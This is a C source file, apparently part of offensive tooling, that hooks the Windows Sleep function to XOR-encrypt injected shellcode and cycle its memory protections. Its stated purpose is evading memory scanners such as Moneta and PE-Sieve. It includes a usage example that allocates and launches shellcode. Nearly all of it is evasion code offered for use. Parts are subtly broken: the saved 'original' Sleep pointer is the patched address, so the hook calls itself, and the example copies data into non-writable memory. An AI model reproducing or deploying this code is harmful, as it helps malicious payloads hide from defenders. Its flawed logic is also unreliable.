/*
 * Memory Fluctuation - RW<->RX Cycling
 * Based on 2026 research: Shellcode-Memory-Fluctuation, CoRIIN 2026
 * 
 * Technique:
 * 1. Hook kernel32!Sleep to intercept dormant periods
 * 2. Encrypt shellcode + flip to PAGE_READWRITE (or PAGE_NOACCESS)
 * 3. Call original Sleep
 * 4. Decrypt shellcode + flip back to PAGE_EXECUTE_READ
 * 5. Evades memory scanners (Moneta, PE-Sieve)
 */

#include <windows.h>
#include <stdint.h>

// XOR32 encryption for memory fluctuation
static void xor32_encrypt(uint8_t* data, size_t size, uint32_t key) {
    uint32_t* data32 = (uint32_t*)data;
    size_t count = size / 4;
    
    for (size_t i = 0; i < count; i++) {
        data32[i] ^= key;
    }
    
    // Handle remaining bytes
    for (size_t i = count * 4; i < size; i++) {
        data[i] ^= (uint8_t)(key & 0xFF);
    }
}

// Memory region tracking
typedef struct {
    void* address;
    size_t size;
    uint32_t key;
    DWORD original_protect;
    int is_encrypted;
} MemoryRegion;

// Original Sleep function pointer
typedef void (WINAPI *pSleep_t)(DWORD);
static pSleep_t original_sleep = NULL;

// Global memory region
static MemoryRegion* g_region = NULL;

// Custom Sleep hook
static void WINAPI hooked_sleep(DWORD milliseconds) {
    if (!g_region || !g_region->address) {
        // No region to protect, call original
        if (original_sleep) {
            original_sleep(milliseconds);
        }
        return;
    }
    
    DWORD old_protect;
    
    // === ENCRYPT PHASE ===
    // 1. Flip to RW
    VirtualProtect(g_region->address, g_region->size, PAGE_READWRITE, &old_protect);
    
    // 2. Encrypt shellcode
    xor32_encrypt((uint8_t*)g_region->address, g_region->size, g_region->key);
    g_region->is_encrypted = 1;
    
    // 3. Optionally flip to PAGE_NOACCESS for maximum stealth
    // VirtualProtect(g_region->address, g_region->size, PAGE_NOACCESS, &old_protect);
    
    // 4. Call original Sleep
    if (original_sleep) {
        original_sleep(milliseconds);
    }
    
    // === DECRYPT PHASE ===
    // 5. Flip back to RW (if was NOACCESS)
    // VirtualProtect(g_region->address, g_region->size, PAGE_READWRITE, &old_protect);
    
    // 6. Decrypt shellcode
    xor32_encrypt((uint8_t*)g_region->address, g_region->size, g_region->key);
    g_region->is_encrypted = 0;
    
    // 7. Flip to RX
    VirtualProtect(g_region->address, g_region->size, PAGE_EXECUTE_READ, &old_protect);
}

// Install Sleep hook
static int install_sleep_hook(void) {
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    if (!kernel32) return 0;
    
    void* sleep_addr = GetProcAddress(kernel32, "Sleep");
    if (!sleep_addr) return 0;
    
    // Save original function
    original_sleep = (pSleep_t)sleep_addr;
    
    // Install inline hook (trampoline)
    DWORD old_protect;
    if (!VirtualProtect(sleep_addr, 14, PAGE_EXECUTE_READWRITE, &old_protect)) {
        return 0;
    }
    
    // Write JMP to hooked_sleep
    // mov rax, address
    // jmp rax
    uint8_t* code = (uint8_t*)sleep_addr;
    code[0] = 0x48;  // REX.W
    code[1] = 0xB8;  // MOV RAX, imm64
    *(uint64_t*)(code + 2) = (uint64_t)hooked_sleep;
    code[10] = 0xFF; // JMP RAX
    code[11] = 0xE0;
    
    VirtualProtect(sleep_addr, 14, old_protect, &old_protect);
    
    return 1;
}

// Initialize memory fluctuation for a region
int init_memory_fluctuation(void* address, size_t size, uint32_t key) {
    g_region = (MemoryRegion*)malloc(sizeof(MemoryRegion));
    if (!g_region) return 0;
    
    g_region->address = address;
    g_region->size = size;
    g_region->key = key;
    g_region->is_encrypted = 0;
    
    // Get current protection
    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery(address, &mbi, sizeof(mbi));
    g_region->original_protect = mbi.Protect;
    
    // Install Sleep hook
    if (!install_sleep_hook()) {
        free(g_region);
        g_region = NULL;
        return 0;
    }
    
    return 1;
}

// Cleanup
void cleanup_memory_fluctuation(void) {
    if (g_region) {
        // Ensure decrypted before cleanup
        if (g_region->is_encrypted) {
            xor32_encrypt((uint8_t*)g_region->address, g_region->size, g_region->key);
        }
        
        free(g_region);
        g_region = NULL;
    }
}

// Alternative: PAGE_NOACCESS mode with VEH
static LONG WINAPI veh_handler(EXCEPTION_POINTERS* exception_info) {
    if (exception_info->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        void* fault_addr = (void*)exception_info->ExceptionRecord->ExceptionInformation[1];
        
        // Check if fault is in our protected region
        if (g_region && fault_addr >= g_region->address && 
            fault_addr < (uint8_t*)g_region->address + g_region->size) {
            
            DWORD old_protect;
            
            // Decrypt and flip to RX
            VirtualProtect(g_region->address, g_region->size, PAGE_READWRITE, &old_protect);
            xor32_encrypt((uint8_t*)g_region->address, g_region->size, g_region->key);
            VirtualProtect(g_region->address, g_region->size, PAGE_EXECUTE_READ, &old_protect);
            
            g_region->is_encrypted = 0;
            
            // Continue execution
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    
    return EXCEPTION_CONTINUE_SEARCH;
}

// Initialize PAGE_NOACCESS mode with VEH
int init_memory_fluctuation_veh(void* address, size_t size, uint32_t key) {
    g_region = (MemoryRegion*)malloc(sizeof(MemoryRegion));
    if (!g_region) return 0;
    
    g_region->address = address;
    g_region->size = size;
    g_region->key = key;
    g_region->is_encrypted = 0;
    
    // Install VEH handler
    AddVectoredExceptionHandler(1, veh_handler);
    
    // Install Sleep hook
    if (!install_sleep_hook()) {
        free(g_region);
        g_region = NULL;
        return 0;
    }
    
    return 1;
}

/*
 * Usage Example:
 * 
 * // After allocating shellcode
 * void* shellcode = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READ);
 * memcpy(shellcode, encrypted_data, size);
 * 
 * // Initialize fluctuation
 * uint32_t key = 0xDEADBEEF;
 * init_memory_fluctuation(shellcode, size, key);
 * 
 * // Execute shellcode
 * CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcode, NULL, 0, NULL);
 * 
 * // Shellcode will automatically fluctuate during Sleep() calls
 * // Memory scanners will see encrypted RW pages instead of executable code
 */
